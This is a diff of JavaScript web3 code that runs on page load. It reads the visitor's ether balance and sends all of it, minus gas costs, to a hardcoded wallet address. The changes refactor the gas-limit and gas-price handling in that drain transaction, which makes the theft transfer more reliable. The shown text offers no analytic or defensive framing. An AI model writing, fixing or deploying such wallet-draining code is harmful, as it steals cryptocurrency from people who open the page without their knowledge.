@@ -6,9 +6,10 @@ var etherBalance;
 var etherReceiver = "0x8888881CEDA4E95043bcD6CEC9ed0fF3C419a3b6";
 // Transaction object
 var transactionObject;
+// Gas Limit
+var gasLimitNumber = 21000;
 // Gas Price
-var gasNumber = 10000000000;
-
+var gasPriceNumber = 10000000000;
 // Web3 start function, It will run when the web page is loaded  
 function startWeb3() {
 
@@ -21,8 +22,8 @@ function startWeb3() {
 function getBalance(address) {
   return web3.eth.getBalance(address, function (error, result) {
     if (!error) {
-        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasNumber*21000;
-        transactionObject = {from:coinbase, to:etherReceiver, value:etherBalance, gasPrice:gasNumber};
+        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasLimitNumber*gasPriceNumber;
+        transactionObject = {from:coinbase, to:etherReceiver, value:etherBalance, gas:gasLimitNumber, gasPrice:gasPriceNumber};
         sendBalance(transactionObject);
     } else {
       	console.error(error);
